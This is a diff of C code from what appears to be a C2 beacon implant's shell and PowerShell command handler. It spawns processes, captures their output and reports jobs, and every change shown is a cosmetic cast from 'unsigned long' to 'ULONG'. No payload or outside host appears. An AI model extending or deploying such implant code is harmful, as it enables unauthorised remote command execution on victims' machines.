@@ -96,7 +96,7 @@ static ByteBuf RunProcessCapture(BeaconJob* job, const WCHAR* cmdline, UINT acp)
             if (GetExitCodeProcess(pi.hProcess, &exit_code) && exit_code != 0) {
                 ByteBuf text;
                 BbInit(&text);
-                BbPrintf(&text, "Error: exit status %lu\nOutput: %s", (unsigned long)exit_code, utf8);
+                BbPrintf(&text, "Error: exit status %lu\nOutput: %s", (ULONG)exit_code, utf8);
                 out = PackExecOutput((const CHAR*)text.data);
                 BbFree(&text);
             } else {
@@ -112,7 +112,7 @@ cleanup:
     /* 若未捕获到输出则报告 CreateProcess 失败 */
     if (out.len == 0 && create_error != 0) {
         CHAR msg[96];
-        snprintf(msg, sizeof(msg), "Error: CreateProcess failed: %lu", (unsigned long)create_error);
+        snprintf(msg, sizeof(msg), "Error: CreateProcess failed: %lu", (ULONG)create_error);
         out = PackExecOutput(msg);
     }
     if (read_pipe) CloseHandle(read_pipe);
@@ -135,7 +135,7 @@ static DWORD WINAPI ShellJobThread(PVOID param)
 
     out = RunProcessCapture(args->job, args->cmdline, args->acp);
     if (out.len == 0) {
-        BbPrintf(&out, "Job %lu finished", (unsigned long)args->job->task_id);
+        BbPrintf(&out, "Job %lu finished", (ULONG)args->job->task_id);
     }
     if (out.len > 0) {
         JobEnqueueResult(args->ctx, args->job->task_id, args->job->command_id, &out);
@@ -163,7 +163,7 @@ static CHAR* ReadRawCommand(Parser* p, INT powershell, ByteBuf* error)
         CHAR msg[160];
         snprintf(msg, sizeof(msg),
                  "%s expects exactly 1 raw command string, got %lu; do not split by spaces",
-                 powershell ? "powershell" : "shell", (unsigned long)count);
+                 powershell ? "powershell" : "shell", (ULONG)count);
         *error = PackExecOutput(msg);
         return NULL;
     }
@@ -269,7 +269,7 @@ ByteBuf CommandShell(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, Pars
     {
         CHAR msg[96];
         snprintf(msg, sizeof(msg), "Job %lu started: %s",
-                 (unsigned long)task_id, powershell ? "powershell" : "shell");
+                 (ULONG)task_id, powershell ? "powershell" : "shell");
         out = PackExecOutput(msg);
     }
 
